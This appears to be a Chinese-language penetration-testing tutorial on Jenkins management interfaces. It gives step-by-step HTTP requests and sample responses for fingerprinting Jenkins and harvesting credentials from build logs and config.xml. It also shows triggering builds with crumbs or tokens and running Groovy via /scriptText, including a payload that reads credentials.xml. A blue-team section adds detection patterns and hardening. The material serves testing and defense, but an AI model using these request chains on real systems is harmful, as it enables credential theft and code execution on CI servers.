---
title: "Jenkins管理面打点与接口利用技术"
date: 2026-06-13T13:46:56+08:00
draft: false
weight: 47
description: "围绕Jenkins相关攻击面与利用路径，分析打点识别、接口枚举、风险链条、日志痕迹与防守处置思路。"
categories: ["安全", "渗透测试"]
tags: ["渗透测试", "漏洞利用", "管理面打点", "Jenkins"]
---

# Jenkins管理面打点与接口利用技术

`Jenkins` 在渗透测试中属于典型的高价值管理面。它不像普通业务系统那样只承载单一业务逻辑，而是天然具备：

- 代码拉取与构建能力
- 凭据存储能力
- 插件扩展能力
- 脚本执行能力
- 与云平台、制品库、Git、Kubernetes、部署系统联动的能力

这意味着一旦 Jenkins 管理面暴露、弱鉴权、误开放匿名读权限，攻击者就不只是“看到一个后台”，而是可能直接拿到：

- 内部仓库凭据
- 云密钥
- 构建机执行能力
- 源代码与制品访问权限
- 控制器级 Groovy 执行能力

本文继续按你当前要求的写法整理，只聚焦“打点与漏洞利用”，不展开后渗透横向，重点记录：

1. 如何识别 Jenkins 管理面
2. 匿名访问与低权限访问能拿到什么
3. 如何基于 `crumb`、API Token、`api/json`、`config.xml`、脚本控制台推进利用
4. 如何记录每一步请求与响应案例
5. 蓝队在访问日志、审计日志和系统日志中应如何识别这类打点

---

## 0. 攻击面概览

### 0.1 为什么 Jenkins 适合做“打点主题”

Jenkins 很适合放在 `04 渗透攻击` 下，不是因为它一定总有一个单点 CVE，而是因为它是典型的“管理面方法学资产”：

- 路径稳定，容易识别
- 未授权、弱授权、误配置场景极多
- 响应内容结构固定，适合自动化打点
- 从信息泄露到执行链存在清晰递进

相比单一漏洞文章，Jenkins 更适合沉淀为一篇“如何从管理面一步步逼近真正利用点”的技术手册。

### 0.2 常见路径

首轮至少应枚举：

- `/`
- `/login`
- `/manage`
- `/script`
- `/scriptText`
- `/computer/api/json`
- `/api/json`
- `/crumbIssuer/api/json`
- `/jnlpJars/jenkins-cli.jar`
- `/view/All/api/json`
- `/credentials/`
- `/pluginManager/api/json`
- `/whoAmI/api/json`
- `/job/<name>/config.xml`

如果是 Blue Ocean 环境，还要额外关注：

- `/blue/`
- `/blue/rest/`

### 0.3 打点收益优先级

以“最适合初始利用”为标准，Jenkins 常见收益面可以这样排：

1. 匿名访问 + `api/json` 信息泄露
2. 匿名或低权限可读 Job 配置、构建日志
3. 可获取 `crumb` 或 API Token 后调用危险接口
4. 脚本控制台或脚本相关端点可达
5. CLI 可用且版本/权限存在可利用面

---

## 1. 第一轮打点：确认是不是 Jenkins

### 1.1 基础页面识别

#### 请求示例

```http
GET /login HTTP/1.1
Host: ci.target.example
User-Agent: Mozilla/5.0
Accept: text/html
Connection: close
```

#### 典型响应示例

```http
HTTP/1.1 200 OK
Content-Type: text/html;charset=UTF-8
Set-Cookie: JSESSIONID.12345=node0abcd; Path=/; HttpOnly
X-Jenkins: 2.426.2
X-Jenkins-Session: 4b3bb5db
X-Hudson: 1.395
```

高价值识别点包括：

- `X-Jenkins`
- `X-Hudson`
- 登录页标题中的 `Dashboard [Jenkins]`
- 页面静态资源路径中出现 `/adjuncts/`

如果直接回显 Jenkins 版本，后续就可以继续判断：

- 是否存在已知版本问题
- 是否需要重点关注 CLI、Blue Ocean、特定插件链

### 1.2 根 API 识别

#### 请求示例

```http
GET /api/json HTTP/1.1
Host: ci.target.example
Accept: application/json
Connection: close
```

#### 典型响应示例

```json
{
  "_class": "hudson.model.Hudson",
  "assignedLabels": [],
  "mode": "NORMAL",
  "nodeDescription": "the Jenkins controller",
  "nodeName": "",
  "numExecutors": 2,
  "useCrumbs": true,
  "useSecurity": true,
  "views": [
    {
      "name": "All",
      "url": "https://ci.target.example/"
    }
  ]
}
```

这条响应的价值很高，因为它一口气给出了：

- 这是 Jenkins 控制器
- 是否启用 `useSecurity`
- 是否启用 `useCrumbs`
- 当前视图情况

如果匿名可读 `/api/json`，通常说明后续还有更多读面值得继续探。

### 1.3 身份判断

#### 请求示例

```http
GET /whoAmI/api/json HTTP/1.1
Host: ci.target.example
Accept: application/json
Connection: close
```

#### 典型响应示例

```json
{
  "_class": "hudson.security.WhoAmI",
  "authenticated": false,
  "anonymous": true,
  "authorities": [
    "anonymous"
  ]
}
```

如果这里返回匿名身份而不是 `403`，就说明：

- 站点至少允许匿名 API 访问
- 后续应继续测试哪些接口对匿名用户开放

---

## 2. 第二轮打点：匿名与低权限能读到什么

### 2.1 列出视图和任务

#### 请求示例

```http
GET /view/All/api/json?tree=jobs[name,url,color] HTTP/1.1
Host: ci.target.example
Accept: application/json
Connection: close
```

#### 典型响应示例

```json
{
  "jobs": [
    {
      "name": "prod-deploy",
      "url": "https://ci.target.example/job/prod-deploy/",
      "color": "blue"
    },
    {
      "name": "debug-release",
      "url": "https://ci.target.example/job/debug-release/",
      "color": "red"
    }
  ]
}
```

这类响应会直接暴露：

- Job 命名风格
- 哪些任务像生产部署、调试任务、运维任务
- 是否值得继续访问具体 Job 详情

### 2.2 读取 Job 元信息

#### 请求示例

```http
GET /job/prod-deploy/api/json HTTP/1.1
Host: ci.target.example
Accept: application/json
Connection: close
```

#### 典型响应示例

```json
{
  "name": "prod-deploy",
  "description": "deploy prod release to k8s-cluster-a",
  "buildable": true,
  "nextBuildNumber": 153,
  "lastBuild": {
    "number": 152,
    "url": "https://ci.target.example/job/prod-deploy/152/"
  }
}
```

这里的打点价值在于：

- 暴露生产环境名称
- 暴露集群或制品线索
- 帮助判断是否存在远程构建触发、构建参数污染或日志回收价值

### 2.3 构建日志与控制台输出

匿名或低权限可读构建日志是非常常见的高价值配置问题，因为日志里往往残留：

- Git 凭据
- 云平台 Access Key
- Docker 登录信息
- Maven/NPM 私服凭据
- 部署脚本里的明文 Token

#### 请求示例

```http
GET /job/prod-deploy/152/consoleText HTTP/1.1
Host: ci.target.example
Accept: text/plain
Connection: close
```

#### 典型响应示例

```text
Started by user admin
Cloning the remote Git repository
using credential gitlab-prod-token
 > git fetch --tags --progress https://gitlab-ci-token:glpat-xxxyyyzzz@git.target.example/group/repo.git
Deploying with KUBECONFIG=/var/lib/jenkins/.kube/config
docker login -u deployer -p S3cr3tPass! harbor.target.example
```

这类响应非常适合打点阶段做“直接价值回收”：

- Git Token
- Harbor 凭据
- Kube 配置路径
- Jenkins 内部凭据 ID

#### 蓝队响应点

蓝队不能把 `consoleText` 当成普通日志下载。若匿名或低权限用户大量访问控制台输出，尤其是生产部署任务，应视为高风险凭据回收行为。

### 2.4 `config.xml`：配置级信息泄露

如果用户具备 `Extended Read` 或权限配置错误，`config.xml` 可能可被读取。

#### 请求示例

```http
GET /job/prod-deploy/config.xml HTTP/1.1
Host: ci.target.example
Accept: application/xml
Connection: close
```

#### 典型响应示例

```xml
<project>
  <description>deploy prod release</description>
  <assignedNode>k8s-prod-agent</assignedNode>
  <builders>
    <hudson.tasks.Shell>
      <command>kubectl apply -f deploy.yaml</command>
    </hudson.tasks.Shell>
  </builders>
  <authToken>build-prod-release-token</authToken>
</project>
```

这类响应的价值通常比控制台日志更高，因为它可能直接给出：

- 构建授权 Token
- Agent 节点名
- 执行脚本
- 构建参数与环境变量引用

公开的 Jenkins 安全通告也强调了构建授权 Token 在某些版本中会以明文存储于 `config.xml` 中，这会让“读配置”直接变成“远程触发构建”前置条件。

---

## 3. 第三轮打点：`crumb`、API Token 与 POST 能力

Jenkins 的很多危险接口不是 `GET`，而是要求：

- 已认证身份
- 有效 `crumb`
- 或直接使用 API Token

这意味着渗透测试里必须把“能不能拿到 crumb / token”作为中间关键节点，而不是只看有没有匿名页面。

### 3.1 获取 crumb

#### 请求示例

```http
GET /crumbIssuer/api/json HTTP/1.1
Host: ci.target.example
Authorization: Basic dXNlcjpwYXNz
Accept: application/json
Connection: close
```

#### 典型响应示例

```json
{
  "_class": "hudson.security.csrf.DefaultCrumbIssuer",
  "crumb": "0db38413bd7ec9e98974f5213f7ead8b",
  "crumbRequestField": "Jenkins-Crumb"
}
```

这条响应意味着：

- 当前身份已通过认证
- 后续可对需要 CSRF 保护的 POST 接口发请求

### 3.2 用 crumb 触发构建

#### 请求示例

```http
POST /job/prod-deploy/build HTTP/1.1
Host: ci.target.example
Authorization: Basic dXNlcjpwYXNz
Jenkins-Crumb: 0db38413bd7ec9e98974f5213f7ead8b
Connection: close
Content-Length: 0
```

#### 典型响应示例

```http
HTTP/1.1 201 Created
Location: https://ci.target.example/queue/item/481/
```

如果这里成功，说明攻击已经从“信息打点”进入“可实际驱动目标执行构建”的阶段。

#### 常见失败响应

```http
HTTP/1.1 403 Forbidden
No valid crumb was included in the request
```

这类失败并不意味着没有利用价值，而是说明：

- 需要正确的 crumb
- 或需要 API Token
- 或当前会话与 crumb 不在同一会话上下文

### 3.3 直接用 API Token 调用

部分自动化场景下，Jenkins 更推荐使用 API Token 而不是基于密码 + crumb 的脚本式请求。

#### 请求示例

```http
GET /api/json HTTP/1.1
Host: ci.target.example
Authorization: Basic dXNlcjphcGlfdG9rZW4=
Accept: application/json
Connection: close
```

#### 典型响应示例

```json
{
  "_class": "hudson.model.Hudson",
  "useCrumbs": true,
  "useSecurity": true
}
```

如果攻击者已经从别处拿到了某个 API Token，那么很多 Jenkins 打点动作会显著简化。

---

## 4. 第四轮打点：高危利用面

### 4.1 Script Console：最直接的控制器执行面

如果目标开放了管理员级脚本控制台，风险通常已经不需要再解释。

#### 请求示例

```http
GET /script HTTP/1.1
Host: ci.target.example
Authorization: Basic YWRtaW46YXBpdG9rZW4=
Connection: close
```

#### 典型响应示例

```http
HTTP/1.1 200 OK
Content-Type: text/html;charset=UTF-8
```

如果能打开 `/script` 页面，就说明下一步基本已经可以提交 Groovy。

#### 提交脚本请求示例

```http
POST /scriptText HTTP/1.1
Host: ci.target.example
Authorization: Basic YWRtaW46YXBpdG9rZW4=
Jenkins-Crumb: 0db38413bd7ec9e98974f5213f7ead8b
Content-Type: application/x-www-form-urlencoded
Connection: close

script=println("jenkins-test")
```

#### 典型响应示例

```text
Result
jenkins-test
```

如果这里能稳定输出 Groovy 结果，就说明：

- 目标控制器代码执行面已被命中
- 后续可继续读取文件、环境变量、凭据、系统信息

### 4.2 读取控制器文件与环境变量

很多 Jenkins 攻击并不需要立刻反弹 Shell，先回收环境和配置往往更稳。

#### 请求示例

```http
POST /scriptText HTTP/1.1
Host: ci.target.example
Authorization: Basic YWRtaW46YXBpdG9rZW4=
Jenkins-Crumb: 0db38413bd7ec9e98974f5213f7ead8b
Content-Type: application/x-www-form-urlencoded
Connection: close

script=println(new File("/var/lib/jenkins/credentials.xml").text)
```

#### 典型响应示例

```xml
<com.cloudbees.plugins.credentials.SystemCredentialsProvider>
  ...
</com.cloudbees.plugins.credentials.SystemCredentialsProvider>
```

从打点角度看，这一步的价值是：

- 可以先验证读取能力
- 再决定是否继续拿 `secrets/master.key`、`hudson.util.Secret` 等本地密钥材料

### 4.3 构建授权 Token 触发

如果前面从 `config.xml` 或 UI 中回收到了构建授权 Token，常见利用路径是直接远程触发任务。

#### 请求示例

```http
POST /job/prod-deploy/build?token=build-prod-release-token HTTP/1.1
Host: ci.target.example
Connection: close
Content-Length: 0
```

#### 典型响应示例

```http
HTTP/1.1 201 Created
Location: https://ci.target.example/queue/item/492/
```

如果对应 Job 本身带有：

- Shell 执行
- 参数化脚本
- SCM 拉取
- 制品下载

那么“远程触发构建”本身就可能变成进一步利用入口。

### 4.4 CLI 面与文件读取风险

Jenkins 自带 CLI，且历史上多次出现与 CLI、插件、参数解析相关的高危问题。2024 年的官方通告明确指出，旧版本 CLI 的参数解析行为可导致任意文件读取，并在特定条件下继续扩大到更严重后果。

#### 请求示例：探测 CLI 资源

```http
GET /jnlpJars/jenkins-cli.jar HTTP/1.1
Host: ci.target.example
Connection: close
```

#### 典型响应示例

```http
HTTP/1.1 200 OK
Content-Type: application/java-archive
Content-Length: 348272
```

这条响应说明：

- 目标暴露了 Jenkins CLI 资源
- 后续可继续判断 WebSocket CLI、HTTP CLI 或历史版本风险面

#### 请求示例：WebSocket CLI 握手探测

```http
GET /cli/ws HTTP/1.1
Host: ci.target.example
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Version: 13
Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==
```

#### 典型响应示例

```http
HTTP/1.1 101 Switching Protocols
Upgrade: websocket
Connection: upgrade
```

这一步不等于漏洞利用成功，但对打点来说价值很高，因为它说明：

- WebSocket CLI 可达
- 某些 CLI 相关利用路径具备继续测试的前提

---

## 5. 第五轮打点：插件与扩展面

Jenkins 的另一个高风险点在于插件。

### 5.1 列出插件

#### 请求示例

```http
GET /pluginManager/api/json?depth=1 HTTP/1.1
Host: ci.target.example
Authorization: Basic dXNlcjphcGlfdG9rZW4=
Accept: application/json
Connection: close
```

#### 典型响应示例

```json
{
  "plugins": [
    {
      "shortName": "blueocean",
      "version": "1.27.9",
      "active": true
    },
    {
      "shortName": "gitlab-plugin",
      "version": "1.7.14",
      "active": true
    }
  ]
}
```

这会直接帮助你判断：

- 是否存在 Blue Ocean 路由面
- 是否存在已知高风险插件链
- 是否需要转向插件特定接口测试

### 5.2 Blue Ocean 与扩展 API

#### 请求示例

```http
GET /blue/rest/organizations/jenkins/pipelines/ HTTP/1.1
Host: ci.target.example
Authorization: Basic dXNlcjphcGlfdG9rZW4=
Accept: application/json
Connection: close
```

#### 典型响应示例

```json
[
  {
    "name": "prod-deploy",
    "displayName": "prod-deploy"
  }
]
```

Blue Ocean 面不是本文重点，但应在打点中记录下来，因为：

- 它可能引出不同的 REST 接口
- 某些历史问题就出现在 Blue Ocean 相关路径中

---

## 6. 打点流程建议

比起一上来盲目点 `/script`，更稳的 Jenkins 打点流程通常如下：

### 6.1 第一轮：识别与版本

先拿：

- `/login`
- `/api/json`
- `/whoAmI/api/json`
- `/jnlpJars/jenkins-cli.jar`

目的：

- 判断是不是 Jenkins
- 看版本、匿名性、CLI 面是否暴露

### 6.2 第二轮：读面回收

再打：

- `/view/All/api/json`
- `/job/*/api/json`
- `/job/*/consoleText`
- `/job/*/config.xml`

目的：

- 找生产任务
- 找日志里的凭据
- 找构建 Token、Agent、脚本

### 6.3 第三轮：POST 能力与执行链

在已有身份或回收到凭据后：

- `/crumbIssuer/api/json`
- `/job/*/build`
- `/script`
- `/scriptText`
- `/pluginManager/api/json`

目的：

- 判断是否能真正推动 Jenkins 执行动作

---

## 7. 蓝队检测与处置

### 7.1 访问日志中的高价值信号

至少应重点监控下面这些路径：

- `/api/json`
- `/whoAmI/api/json`
- `/crumbIssuer/api/json`
- `/jnlpJars/jenkins-cli.jar`
- `/job/*/consoleText`
- `/job/*/config.xml`
- `/script`
- `/scriptText`
- `/pluginManager/api/json`

#### 日志示例

```text
10.10.10.21 - - [12/Jun/2026:23:05:11 +0800] "GET /api/json HTTP/1.1" 200 1182 "-" "curl/8.7.1"
```

```text
10.10.10.21 - - [12/Jun/2026:23:05:16 +0800] "GET /job/prod-deploy/152/consoleText HTTP/1.1" 200 84219 "-" "curl/8.7.1"
```

```text
10.10.10.21 - - [12/Jun/2026:23:05:30 +0800] "POST /scriptText HTTP/1.1" 200 26 "-" "curl/8.7.1"
```

这三类访问的风险级别并不相同：

- 第一条更像打点识别
- 第二条更像敏感信息回收
- 第三条通常已经非常接近或达到控制器执行

### 7.2 Jenkins 自身审计与系统日志

Jenkins 本身和周边系统常能提供这些高价值线索：

- 登录失败或异常 API 调用
- Job 被远程触发
- Script Console 执行记录
- 插件管理页面访问
- 系统日志中出现异常 Groovy 执行、CLI 连接、Blue Ocean 路由访问

#### 日志示例

```text
INFO  hudson.model.AsyncPeriodicWork#lambda$doRun$0: Started prod-deploy #153
```

```text
WARNING hudson.security.csrf.CrumbFilter doFilter No valid crumb was included in request for /job/prod-deploy/build by 10.10.10.21
```

```text
INFO  jenkins.model.Jenkins script console accessed by admin from 10.10.10.21
```

### 7.3 处置建议

一旦发现 Jenkins 正在被打点或利用，应优先执行：

1. 关闭匿名读权限
2. 审计所有可匿名访问的 `api/json`、日志、配置与 CLI 资源
3. 检查是否有敏感 Job 被读取 `consoleText` 或 `config.xml`
4. 检查是否存在异常 `crumbIssuer` 请求后紧随其后的危险 POST
5. 轮换 Jenkins 中存储或日志中暴露的外部系统凭据
6. 审核 Script Console、API Token、构建触发 Token、CLI 使用记录

长期加固建议：

- 禁止生产 Jenkins 对匿名用户暴露任何读能力
- 限制 `Extended Read`
- 禁止在构建日志中输出敏感值
- 关闭不必要的 CLI / Blue Ocean / 脚本相关功能
- 按版本及时修复 Jenkins core 与高风险插件

---

## 8. 复盘清单

### 8.1 红队侧

- 是否先确认了匿名面和版本信息
- 是否优先回收了 Job 元数据、构建日志和配置
- 是否记录了 `crumb` 获取与后续 POST 响应
- 是否确认了 Script Console 与 CLI 面是否可达
- 是否把插件列表与后续路径测试关联起来

### 8.2 蓝队侧

- 是否能识别 Jenkins 典型打点路径
- 是否能区分“识别行为”“凭据回收行为”“执行行为”
- 是否能关联 `crumbIssuer` 请求和随后危险 POST
- 是否对敏感 Job 的日志下载和配置读取建立了单独告警

### 8.3 应急侧

- 是否确认 Jenkins 中的外部系统凭据有没有被泄露
- 是否确认是否已有恶意构建被触发
- 是否确认 Script Console 或 CLI 是否被使用
- 是否已经轮换 Git、云平台、镜像仓库、部署系统凭据

---

## 9. 总结

`Jenkins` 在渗透测试里的价值，不只是“一个后台系统”，而是一个能把代码、构建、凭据和执行能力串到一起的管理枢纽。

对打点来说，真正应积累的不是零散的 Jenkins CVE，而是这种方法学：

- 先确认版本与匿名面
- 再读 Job、日志、配置
- 再拿 `crumb` 或 Token
- 最后判断是否能推进到脚本执行或远程构建

这类思路非常适合长期沉淀在 `04 渗透攻击` 目录中，作为管理面打点与漏洞利用的固定专题。

---

## 参考资料

- [Jenkins Security Advisory 2024-01-24](https://www.jenkins.io/security/advisory/2024-01-24/)
- [Jenkins Vulnerabilities and Scoring](https://www.jenkins.io/security/vulnerabilities/)
- [Jenkins Script Console Documentation](https://www.jenkins.io/doc/book/managing/script-console/)
- [Jenkins CSRF Protection](https://www.jenkins.io/doc/book/security/csrf-protection/)
- [Hackviser: Jenkins Pentesting Notes](https://hackviser.com/tactics/pentesting/services/jenkins)
